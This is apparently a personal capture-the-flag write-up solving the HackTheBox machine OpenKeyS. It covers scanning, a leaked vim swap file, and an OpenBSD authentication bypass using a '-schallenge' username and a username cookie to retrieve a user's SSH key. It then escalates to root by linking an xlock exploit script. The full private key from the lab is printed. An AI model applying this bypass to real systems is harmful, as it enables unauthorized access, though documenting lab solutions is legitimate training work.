---
title: "OpenKeyS - HackTheBox"
date: 2020-08-26T13:11:38-04:00
draft: false
showToc: true
description: "My solve to the OpenKeyS machine on HackTheBox"
tags: ["htb"]
categories: ["htb"]
---

A medium rated box that should have been rated easy

## TL;DR

User: OpenBSD box has ssh and http available, used gobuster and found nano .swp file which had username and shellcode. Shellcode hinted at username verification, found OpenBSD login vulnerability online using `-schallenge` and got Jennifer's OpenSSH key by adding a cookie as `username:jennifer`, and logging in again. Saved OpenSSH key as `id_rsa` within new folder, changed permissions for file, and used ssh with private key to box.

Root: The website where I found the -schallenge had a CVE associated with it for privesc, used local privesc program to gain root privileges. 

## User

### Nmap

As with any box, I started with an nmap scan of 10.10.10.199. Since the last writeup, i've started using a custom nmap command that uses `grc`, making all output nicely color-coded. Highly recommend looking into it.

```
$ nmap -sCV  10.10.10.199 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 17:02 EDT
Nmap scan report for 10.10.10.199
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
80/tcp open  http    OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.33 seconds
```

From my nmap scan, we can see that port 22 (ssh) and port 80 (http) are open, so we can attempt at navigating to the website.
Navigating to the website shows us a login page for a OpenSSH key retrieval site, and inspecting the website shows us that the login button, username and password field all take actual input. Everything else on the page is a placeholder.

Based on recommendation from Neon, I started a gobuster scan on the ip address. During corona-cation, I found a repository called SecLists that hosted numerous wordlists that are nicely separated into different categories. IMO, these wordlists are easier to use and better than the default wordlists.

```
$ gobuster dir -w ./common.txt -u http://10.10.10.199/ -t 200
===============================================================
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/vendor (Status: 301)
===============================================================
```

The gobuster scan finished and returned a couple directories that exist on the webpage. Navigating to each one started to show nothing, until the directory of `/includes`, which showed two files, `auth.php` and `auth.php.swp`. The `.swp` file immediately caught my attention, because that is the temporary file that the text editor nano or vim creates temporarily then deletes unless an issue occurs. Using `wget` I downloaded the `auth.php.swp` file.
<details>
  <summary>$ wget http://10.10.10.199/includes/auth.php.swp </summary>

```
$ wget http://10.10.10.199/includes/auth.php.swp
$ strings auth.php.swp 
b0VIM 8.1
jennifer
openkeys.htb
/var/www/htdocs/includes/auth.php
3210
#"! 
    session_start();
    session_destroy();
    session_unset();
function close_session()
    $_SESSION["username"] = $_REQUEST['username'];
    $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
    $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["logged_in"] = True;
function init_session()
    }
        return False;
    {
    else
    }
        }
            return True;
            $_SESSION['last_activity'] = $time;
            // Session is active, update last activity time and return True
        {
        else
        }
            return False;
            close_session();
        {
            ($time - $_SESSION['last_activity']) > $session_timeout)
        if (isset($_SESSION['last_activity']) && 
        $time = $_SERVER['REQUEST_TIME'];
        // Has the session expired?
    {
    if(isset($_SESSION["logged_in"]))
    // Is the user logged in? 
    session_start();
    // Start the session
    $session_timeout = 300;
    // Session timeout in seconds
function is_active_session()
    return $retcode;
    system($cmd, $retcode);
    $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
function authenticate($username, $password)
<?php
```
</details>


From reading `auth.php.swp`, it seems that a user named `jennifer` on `openkeys.htb` was editing a file with VIM when presumably an error occured causing the file to be saved in a `.swp` file. We can see that `auth.php` verifies if a user is logged in by passing arguments as `username` and `password`, and then calls `check_auth` with shellcode in the following line:

```
$cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);{function authenticate($username, $password)
```

If there is shellcode running locally, its usually not good (coughcough*tiktok*coughcough), so I attempted to download the `check_auth` program using `wget http://openkeys.htb/auth_helpers/check_auth`. Running strings on check_auth provided a healthy heap of no information to me.


<details>
  <summary>$ strings check_auth</summary>
  
  ```
/usr/libexec/ld.so
OpenBSD
libc.so.95.1
_csu_finish
exit
_Jv_RegisterClasses
atexit
auth_userokay
_end
AWAVAUATSH
t-E1
t7E1
ASAWAVAT
A\A^A_A[]
ASAWAVP
A^A_A[]L3
Linker: LLD 8.0.1
.interp
.note.openbsd.ident
.dynsym
.gnu.hash
.hash
.dynstr
.rela.dyn
.rela.plt
.eh_frame_hdr
.eh_frame
.text
.init
.fini
.plt
.data
.openbsd.randomdata
.jcr
.ctors
.dtors
.dynamic
.got
.got.plt
.bss
.comment
.symtab
.shstrtab
.strtab
crt0.c
___start
crtbegin.c
__CTOR_LIST__
__DTOR_LIST__
__EH_FRAME_BEGIN__
__JCR_LIST__
__do_fini
__do_fini.finalized
__do_init
__do_init.initialized
__do_init.object
test.c
crtend.c
__csu_do_fini_array
__init
__init_array_end
__init_array_start
__llvm_retpoline_r11
__preinit_array_end
__preinit_array_start
__retguard_1205
__start
_csu_finish
_start
exit
main
_Jv_RegisterClasses
__dso_handle
__fini
__fini_array_end
__fini_array_start
__guard_local
__register_frame_info
__retguard_1471
__retguard_1773
__retguard_2473
atexit
_GLOBAL_OFFSET_TABLE_
auth_userokay
_end
_DYNAMIC
```
</details


Not a big fan of reading what is presumably a C program, so I returned to `auth.php.swp` and read through it again in case there were any more interesting points. As I mentioned earlier, the shellcode portion passes on `username` and `password` which made me wonder if the program is checking if the username:password existed on the box as a user. In that case, we know that the username is `jennifer`.

At this point, I started to google what OpenBSD was, and how I could potentially use a login vulnerability for OpenBSD. The first website on google was from [SecPod](https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/), where they outlined OpenBSD authentication bypass with local privesc, and CVE-2019-19521 was exactly what I needed. 

CVE-2019-19521 described how the OpenBSD authenication process works, and how it could be bypassed by using `-schallenge` as the username. I took this to the login page to use `-schallenge:fdsafdas` as the login, and the response was `OpenSSH key not found for user -schallenge`

My thought that the login username is verified with local users was correct, and we now have new information that the website returns OpenSSH keys if the user exists. All I needed to do now was combine the exploit with a username of jennifer, and appending jennifer to the challenge username did not work. At this point, I was lost for half an hour until I looked at the Official HackTheBox discussion on this machine, and found some interesting comments.

```
Karthik0x00
July 28

@Baud said:

    Alrighty, I found the interesting article and am able to login on the webapp, but now I need to find a way to get the username right to do what the webapp says because it lets me in but it only shows an error... any hints?

Have you ever ate choco-cookies?
```
```
sn0b4ll
July 28

Thanks for the box, overall good experience even if the start was a bit bumpy :smile:

For those struggling with the foothold - search for vulns and combine the read with some delicious cookies :wink:
```
```
Really nice to work on a BSD box for a change! As many people have said the initial foothold is probably the most difficult part, but there are lots of clues that might help you get on the right path.
If you get stuck after finding the finding the vulnerable input, remember that there are several ways to send data to the server.

I was able to get root, but from some of the comments I'm lead to believe that there is a way to do it with that one really popular exploit tool, but I was unable to do so. If anyone did the privesc that way I would appreciate if you sent me a DM and let me know how (which module etc.).
```

From the comments, I assumed that cookie manipulation is necessary for login. I found a [post](https://stackoverflow.com/questions/17769011/how-does-cookie-based-authentication-work) on StackOverflow regarding cookie-based authentication, and took away that I should add a cookie with whatever the webpage was accepting as input. 

Earlier we found that the variables `username` and `password` were being passed along to the shellcode, so I decided that a cookie named `username` with the value being `jennifer` was appropriate, and logged in again as `-schallenge:fdsafdsa`. Voila, an OpenSSH private key is sitting there like a present on Christmas day.


<details>
    <summary> OpenSSH private key</summary>


```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

</details>


Now from here, I've done private key ssh with PillowFood before while creating publicly facing boxes, so I knew how to copy and set private ssh keys with the proper permissions. [Here's](https://community.perforce.com/s/article/6210) a link for an article that covers SSH file permissions

I copied the OpenSSH key to a file named `id_rsa`, and used `chmod 600 id_rsa` to set the proper permissions for SSH to use.

I then ran `ssh -i id_rsa jennifer@10.10.10.199`, and catted the flag.

## Root

On the same SecPod website, there was a local privesc POC. I wanted to give it a try, but I couldn't find an actual exploit. After reaching page 3 of google, I found a [bash script](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot) that utilized the same CVE to gain local privesc.

Copied the code, pasted into a local file on the machine as `exploityeet` and ran it using `./exploityeet`. This process of privesc will be explained in the What did I learn section of this writeup. 

I now had root access, and catted the flag.

## What Did I Learn?

Time is money, and money is time. I don't have enough of either, so this will section will be updated when I have both.

## Links/Resources

| Link | Summary | 
| :--- | --- | 
| [SecPod](https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/) | Authentication bypass using `-schallenge` and privesc |
| [PacketStorm](https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html) | Authentication bypass using `-schallenge` and privesc | 
| [GitHub (exploit)](https://github.com/bcoles/local-exploits) | Privesc exploit using POC | 
| [OpenWall](https://www.openwall.com/lists/oss-security/2019/12/04/5) | login.conf explanation for OpenBSD exploit | 
| [Perforce](https://community.perforce.com/s/article/6210) | SSH file privileges | 
| [StackOverflow](https://stackoverflow.com/questions/17769011/how-does-cookie-based-authentication-work) | Cookie-based authentication | 
| CVE-2019-19520 |  Local privilege escalation via xlock |
